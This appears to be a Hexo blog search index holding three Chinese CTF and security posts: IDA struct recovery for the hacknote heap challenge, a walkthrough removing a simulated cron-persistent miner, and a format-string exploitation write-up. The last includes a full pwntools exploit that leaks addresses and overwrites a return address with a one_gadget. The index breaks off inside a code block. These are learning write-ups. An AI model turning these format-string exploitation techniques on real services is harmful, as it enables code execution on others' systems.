<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>打堆第一步,先”斩“结构体</title>
    <link href="/2023/09/26/%E5%85%88%E2%80%9D%E6%96%A9%E2%80%9C%E7%BB%93%E6%9E%84%E4%BD%93/"/>
    <url>/2023/09/26/%E5%85%88%E2%80%9D%E6%96%A9%E2%80%9C%E7%BB%93%E6%9E%84%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这里我们主要以CTF wiki 上UAF的例题hacknote为例 去创建一个结构体 探索堆题代码结构的真相 让pwn师傅少点逆向的痛</p><p>题目：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote">ctf-challenges&#x2F;pwn&#x2F;heap&#x2F;use_after_free&#x2F;hitcon-training-hacknote&#x2F;hacknote at master · ctf-wiki&#x2F;ctf-challenges (github.com)</a></p><p>引用：<a href="http://f0und.icu/article/13.html#0x10_%E6%81%A2%E5%A4%8D%E7%BB%93%E6%9E%84%E4%BD%93">IDA 分析技巧记录 - F0und</a></p></blockquote><h2 id="1-分析程序"><a href="#1-分析程序" class="headerlink" title="1.分析程序"></a>1.分析程序</h2><p>分析程序 我们发现 主要有这几个需要添加结构体来便于我们分析 首先我们要知道的是</p><blockquote><p>**(&amp;notelist + i)  存的其实是print_note_content这个函数的指针</p><p>*(v0 + 4) 存的其实是content_chunk的指针值</p><p><em>(</em>(&amp;notelist + i) + 1) 这个位置 存储的其实是content的内容</p></blockquote><p>下面我们来讨论一个问题：</p><blockquote><p> 我们要区分 *(v0 + 4) 和 <em>(</em>(&amp;notelist + i) + 1) 里的4 1分别是什么型？</p></blockquote><p>根据指针的运算 我们知道</p><p>其实这里的4 是四个字节 而这里的1 是加了一个整数类型</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926112444800-1696396536733-1-1696397282563-1.png" alt="image-20230926112444800"></p><h2 id="2-创造结构体"><a href="#2-创造结构体" class="headerlink" title="2.创造结构体"></a>2.创造结构体</h2><p>根据分析内容 我们开始尝试去创建结构体</p><p>我们可以直接使用shift＋F1 来进入struct的页面 ida里允许我们直接去写一段c代码的struct来插入(我们只需要在struct界面敲insert键)</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926113317228-1696396536733-2-1696397282563-2.png" alt="image-20230926113317228"></p><p>我们去拟定我们的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"># 我们创建一个名叫hacknote的结构体 并且起了一个简写名称叫note<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">note</span>&#123;</span><br><span class="hljs-type">char</span> * print_ptr;<br><span class="hljs-type">char</span> * content;<br>&#125;hacknote;<br></code></pre></td></tr></table></figure><p>如下图所示:</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926113708054-1696396536733-3-1696397282563-3.png" alt="image-20230926113708054"></p><p>我们成功的添加进入了 两个结构体</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926113745669-1696396536733-4-1696397282563-4.png" alt="image-20230926113745669"></p><h2 id="3-修改数据类型"><a href="#3-修改数据类型" class="headerlink" title="3.修改数据类型"></a>3.修改数据类型</h2><p>我们先修改第一块内容的&amp;notelist+i的内容 按“Y”键查看 ida本来给他识别的数据类型</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145358287-1696396536733-5-1696397282563-5.png" alt="image-20230926145358287"></p><p>按照循环我们知道 应该是会创建5个notelist数组 这里我们能直接修改数组内容</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145638994-1696396536733-6-1696397282563-6.png" alt="image-20230926145638994"></p><p>修改数组内容如下：</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145754188-1696396536733-7-1696397282564-7.png" alt="image-20230926145754188"></p><p>我们可以看到 notelist数组已经被修的十分完美了</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926145850975-1696396536733-8-1696397282564-8.png" alt="image-20230926145850975"></p><blockquote><p>接下来我们来使用我们的结构体</p></blockquote><p>同样的 我们选中notelist数组 修改类型</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926150042763-1696396536733-9-1696397282564-9.png" alt="image-20230926150042763"></p><p>这里我们看到这个类型为void型 我们可以改成我们的结构类型note</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926150206058-1696396536733-10-1696397282564-11.png" alt="image-20230926150206058"></p><p>修完后 我们就可以很清楚的发现我们的代码更清晰了</p><p><img src="/../images/%E5%85%88%E2%80%9C%E6%96%A9%E2%80%9D%E7%BB%93%E6%9E%84%E4%BD%93/image-20230926150308428-1696396536733-11-1696397282564-10.png" alt="image-20230926150308428"></p><blockquote><p>到此，你就已经完成了一次结构体的创建与修复。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>结构体</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次仿真挖矿的&quot;彻底&quot;清除</title>
    <link href="/2023/09/22/%E6%A0%BC%E6%8C%96%E7%9F%BF/"/>
    <url>/2023/09/22/%E6%A0%BC%E6%8C%96%E7%9F%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><p>首先find &#x2F; -mmin 2 查看一下两分钟的运行进程</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212426481-862263094.png" alt="image-20230922200547730"></p><p>我们发现back kthreads都有问题</p><p>我们依次来看</p><p>查看back文件如下 发现循环写入的文件 我们要找维持文件 我们接着找维持文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212426004-1386439901.png" alt="image-20230922200909241"></p><p>查看kthreads文件 成功发现维持文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212425510-2146432774.png" alt="image-20230922201014444"></p><p>打开crontab 发现了计划文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422833-738385297.png" alt="image-20230922201256778"></p><p>我们再运行netstat -antp 找一下外连</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212424594-23813724.png" alt="image-20230922201359853"></p><p>这里我们成功发现外连ip 和程序</p><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h2 id="我们先消灭远连程序"><a href="#我们先消灭远连程序" class="headerlink" title="我们先消灭远连程序"></a>我们先消灭远连程序</h2><p>远连程序在&#x2F;tmp&#x2F;vmware-root_663-402224331x8&#x2F;</p><p>就是bard程序</p><p>执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> /tmp/vmware-root_663-402224331 x8/*<br></code></pre></td></tr></table></figure><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212424236-1576548630.png" alt="image-20230922201902382"></p><h2 id="消灭维持程序"><a href="#消灭维持程序" class="headerlink" title="消灭维持程序"></a>消灭维持程序</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> /bin/kthreads<br></code></pre></td></tr></table></figure><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212423763-865701469.png" alt="image-20230922201957095"></p><h2 id="消灭计划文件"><a href="#消灭计划文件" class="headerlink" title="消灭计划文件"></a>消灭计划文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim /etc/crontab<br></code></pre></td></tr></table></figure><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212423196-1086869727.png" alt="image-20230922202221799"></p><p>删除前</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422833-738385297.png"></p><p>进去删除后两行，删除后</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422465-2042186302.png" alt="image-20230922205955620"></p><h2 id="消除病毒文件"><a href="#消除病毒文件" class="headerlink" title="消除病毒文件"></a>消除病毒文件</h2><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212422105-623403464.png" alt="image-20230922202417676"></p><p>这里我们需要先kill掉父进程 6585</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212421712-1117002146.png" alt="0baee4f8b68788caaa8119c7c39c8f1"></p><p>如图所以 后面6585变为了 1 说明已经杀掉了 父进程</p><p>杀完父进程 我们再kill子进程 12891 和 12938</p><p>最后一步</p><p>进去&#x2F;usr&#x2F;bin删除watchdogdd文件</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212421194-1043759702.png" alt="image-20230922204647158"></p><h2 id="kill远连程序"><a href="#kill远连程序" class="headerlink" title="kill远连程序"></a>kill远连程序</h2><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212420565-875885553.png" alt="image-20230922212254058"></p><p>结果如下：</p><p><img src="/../images/%E6%8C%96%E7%9F%BF/3165230-20230922212420021-99696863.png" alt="image-20230922212337536"></p><h2 id="删除helloworld"><a href="#删除helloworld" class="headerlink" title="删除helloworld"></a>删除helloworld</h2><p>最后 我们删除helloworld即可 所有删除结束</p>]]></content>
    
    
    <categories>
      
      <category>Good_job</category>
      
    </categories>
    
    
    <tags>
      
      <tag>virus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈非栈上格式化字符串</title>
    <link href="/2023/08/05/%E6%A0%BC%E5%BC%8Faformat/"/>
    <url>/2023/08/05/%E6%A0%BC%E5%BC%8Faformat/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这里先浅分析修改返回地址的两种打法，分别是”诸葛连弩”和”四马分肥“</p></blockquote><h2 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h2><blockquote><p>本文例题 以陕西省赛easy_printf为主</p></blockquote><p>无法修改got表地址 我们采用直接修改ret地址</p><p><img src="/../images/format/image-20230805195229862.png"></p><p>简单看一看程序 需要先过一个判断然后进入vuln</p><p><img src="/../images/format/image-20230805195120134.png" alt="image-20230805195120134"></p><p>进入后 有一个13次的循环 可以让我们操作</p><p><img src="/../images/format/image-20230805195344959.png" alt="image-20230805195344959"></p><p>第一步 肯定要先leak出栈地址 程序基地址和libc基地址</p><p>第二步 修改ret地址 改为one_gadget</p><p>关键讲第二步 如何修改</p><h3 id="一、四马分肥"><a href="#一、四马分肥" class="headerlink" title="一、四马分肥"></a>一、四马分肥</h3><blockquote><p>何为四马分肥？其实就是把要写的地址分成四部分 然后分布在栈中 一次性打入</p></blockquote><p>如图所示：</p><p><img src="/../images/format/image-20230805200230567.png" alt="image-20230805200230567"></p><p>这三个位置被我们依次写入了ret地址 ret+2地址 ret+4地址 ret+6地址（这里省略了 因为高位通常都是0 是不需要修改的）看到这里 就可以很快的改写这些位置的数据 只要依次修改20 26 30的位置 便可以一次修改成功</p><blockquote><p>那我们如何构造这样的函数呢？</p></blockquote><p>首先，我们需要找一个<strong>三连指针</strong>和一个<strong>二连或者三连</strong> 这道题初始栈空间如下：</p><p><img src="/../images/format/image-20230805201147152.png" alt="image-20230805201147152"></p><p>我们使用的是 标点一 先就行修改标点二的指向 使3710 –&gt;3760 然后我们再修改标点二位置 也就是修改了3888–&gt;3708</p><blockquote><p>这就是 修改标点一 先就行修改标点二的指向 使3710 –&gt;3760 </p></blockquote><p><img src="/../images/format/image-20230805201938922.png" alt="image-20230805201938922"></p><blockquote><p>然后我们再修改标点二位置 也就是修改了3888–&gt;3708 我们可以清楚的看到 这个位置已经被成功改成了 ret的地址</p></blockquote><p><img src="/../images/format/image-20230805202130416.png" alt="image-20230805202130416"></p><p>再使用标点一 修改标点二指向 使3710 –&gt;3790  然后我们再修改标点二位置 也就是修改了3790  –&gt;3708+2</p><blockquote><p>这里就是 这一步修改完的最后样子 我们可以看到3790这个位置也已经被写成了 ret+2</p></blockquote><p><img src="/../images/format/image-20230805202320512.png" alt="image-20230805202320512"></p><p>再一次使用标点一 修改标点二指向 使3710 –&gt;37b0  然后我们再修改标点二位置 也就是修改了37b0  –&gt;3708+4</p><blockquote><p>我们看到这里已经看出 这其实已经完全改好了 我们只需要进行最后一步 简单的改写数据即可</p></blockquote><p><img src="/../images/format/image-20230805202547825.png" alt="image-20230805202547825"></p><p>改好后的栈图：</p><p><img src="/../images/format/image-20230805202728334.png"></p><p>贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 四马分肥</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)    <span class="hljs-comment">#arch=&#x27;amd64&#x27;,arch=&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>it = <span class="hljs-keyword">lambda</span> : p.interactive()<br>b=<span class="hljs-keyword">lambda</span> :gdb.attach(p)<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>get_leaked_libc64_1 = <span class="hljs-keyword">lambda</span> :u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>get_leaked_libc32 = <span class="hljs-keyword">lambda</span> :u32(p.recv(<span class="hljs-number">4</span>))<br>get_leaked_libc64_2 = <span class="hljs-keyword">lambda</span> :u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br>get_canary = <span class="hljs-keyword">lambda</span>:<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)) <br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27526</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    b()<br><br><br><span class="hljs-comment"># 过判断</span><br>payload1=<span class="hljs-string">&quot;TokameinE_is_the_best_pwner\x00&quot;</span><br>sa(<span class="hljs-string">&quot;Do you know who the best pwner is?&quot;</span>,payload1)<br><br><span class="hljs-comment"># 泄露binary</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;%9$p%29$p%8$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>vuln_42=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>binary_base=vuln_42-<span class="hljs-number">42</span>-elf.symbols[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>leak(<span class="hljs-string">&quot;binary_base&quot;</span>,binary_base)<br><br><span class="hljs-comment"># 泄露libc_base</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>start_240=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=start_240-<span class="hljs-number">240</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br><span class="hljs-comment"># 泄露栈地址</span><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>rbp_16=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>leak(<span class="hljs-string">&quot;rbp_16&quot;</span>,rbp_16)<br><br><span class="hljs-comment"># one_gadget</span><br>one=[<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>one_gadget=libc_base+one[<span class="hljs-number">0</span>]<br>leak(<span class="hljs-string">&quot;one_gadget&quot;</span>,one_gadget)<br><br><br>one_gadget_1 = one_gadget &amp; <span class="hljs-number">0xffff</span>  <span class="hljs-comment"># 后两位</span><br>one_gadget_2 = (one_gadget &gt;&gt; <span class="hljs-number">16</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 往前推俩</span><br>one_gadget_3 = (one_gadget &gt;&gt; <span class="hljs-number">32</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 再往前推两位</span><br>one_gadget_4 = (one_gadget &gt;&gt; <span class="hljs-number">48</span>)&amp; <span class="hljs-number">0xffff</span> <span class="hljs-comment"># 最前面两位</span><br><br>leak(<span class="hljs-string">&quot;one_gadget_1&quot;</span>,one_gadget_1)<br>leak(<span class="hljs-string">&quot;one_gadget_2&quot;</span>,one_gadget_2)<br>leak(<span class="hljs-string">&quot;one_gadget_3&quot;</span>,one_gadget_3)<br>leak(<span class="hljs-string">&quot;one_gadget_4&quot;</span>,one_gadget_4)<br><br><br>location=rbp_16-<span class="hljs-number">8</span><br><br><span class="hljs-comment"># 20位置</span><br>num_1=rbp_16+<span class="hljs-number">80</span><br>num= num_1 &amp; <span class="hljs-number">0xffff</span><br>location_1 = location &amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;num&quot;</span>,num)<br>leak(<span class="hljs-string">&quot;location_1&quot;</span>,location_1)<br><br><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(location_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># 26位置</span><br>num_2=rbp_16+<span class="hljs-number">128</span><br>num= num_2 &amp; <span class="hljs-number">0xffff</span><br>location_2 = (location + <span class="hljs-number">2</span>)&amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;num&quot;</span>,num)<br>leak(<span class="hljs-string">&quot;location_2&quot;</span>,location_2)<br><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(location_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># 30位置</span><br><br>num_3=rbp_16+<span class="hljs-number">160</span><br>num= num_3 &amp; <span class="hljs-number">0xffff</span><br>location_3= (location + <span class="hljs-number">4</span>)&amp; <span class="hljs-number">0xffff</span><br>leak(<span class="hljs-string">&quot;num&quot;</span>,num)<br>leak(<span class="hljs-string">&quot;location_3&quot;</span>,location_3)<br><br><br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(num).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%8$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>payload=<span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(location_3).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%10$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br><br>payload = <span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(one_gadget_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) +  <span class="hljs-string">b&quot;c%20$hn&quot;</span> <br>payload += <span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span> + one_gadget_2 - one_gadget_1).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%26$hn&quot;</span> <br>payload += <span class="hljs-string">b&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span> + one_gadget_3 - one_gadget_2).encode(<span class="hljs-string">&quot;utf-8&quot;</span>) + <span class="hljs-string">b&quot;c%30$hn&quot;</span><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br><br>sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># 这里没啥意义</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">应该是我环境问题 导致 最后会再发一次payload 为了严谨 可以在每个payload后面补上b&#x27;\x00&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 四次没跑</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>  sa(<span class="hljs-string">&quot;What do you want to say?&quot;</span>,<span class="hljs-string">b&#x27;Kee02p\x00&#x27;</span>)<br>it()<br></code></pre></td></tr></table></figure><blockquote><p>关于这种方法的一点点小思考</p></blockquote><p>这种办法其实并不比常规的诸葛连弩的简单 感觉可能某些情况下 反而更加复杂 而且最后一次打的时候 很可能出现超过规定字节 造成溢出 然后出错 另外在改二链的时候 还可能出现因为占用某个栈位置 导致程序崩溃 但是他在一定特殊情况下可以进行 例如我们需要一次打某个地址的话 不能分开打的时候 他就发挥作用了</p><p> 假如这个返回地址 不能被一个一个的改的时候  会利用跳转的时候 或者我们要改某个一直用的函数的got表的时候 可以一次性把got表改了 不会造成冲突</p><h3 id="二、诸葛连弩"><a href="#二、诸葛连弩" class="headerlink" title="二、诸葛连弩"></a>二、诸葛连弩</h3><blockquote><p>何为诸葛连弩？其实就是在一个地址上不断地改 认准他一个人狠打</p></blockquote><p>这个是比较常见 也比较常规的打法 这里需要我们修改 三连指针以改变 第10个位置 第一次指向ret 然后再修改三连指针 第二次指向ret+2     </p><p>然后第三次再修改三连指针 第三次指向ret+4 一点点改ret的值 这就叫”认准他一个打”</p><p>如下例题演示可以对照如下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">content 就是我们要填的内容 也就是one_gadget</span><br><span class="hljs-string">locatione 也就是我们的返回地址ret</span><br><span class="hljs-string">location_1 填 content_1</span><br><span class="hljs-string">location_2 填 content_2</span><br><span class="hljs-string">依次对应</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>[+]content_1---&gt;<span class="hljs-number">0x5226</span><br>[+] content_2---&gt;<span class="hljs-number">0xff84</span><br>[+] content_3---&gt;<span class="hljs-number">0x7fc4</span><br>[+] content_4---&gt;<span class="hljs-number">0x0</span><br>[+] location_1---&gt;<span class="hljs-number">0xc48</span><br>[+] location_2---&gt;<span class="hljs-number">0xc4a</span><br>[+] location_3---&gt;<span class="hljs-number">0xc4c</span><br>[+] location_4---&gt;<span class="hljs-number">0xc4e</span><br></code></pre></td></tr></table></figure><p>初始栈空间如下：</p><p><img src="/../images/format/image-20230805203859513.png" alt="image-20230805203859513"></p><p>修改ret最低两位</p><p>​第一个printf 使0c50–&gt;0c48 </p><p><img src="/../images/format/image-20230805204115181.png" alt="image-20230805204115181"></p><p>​第二个printf 修改0c48里存的内容 也就是修改为one_gadget的后两个字节</p><p><img src="/../images/format/image-20230805204707924.png" alt="image-20230805204707924"></p><p>修改ret次低两位</p><p><img src="/../images/format/image-20230805205444654.png" alt="image-20230805205444654"></p><p>修改ret次次低两位</p><p><img src="/../images/format/image-20230805205547826.png" alt="image-20230805205547826"></p><p>修改ret最高两位</p><p>​高两位都是0 不写也可以 这里省略</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 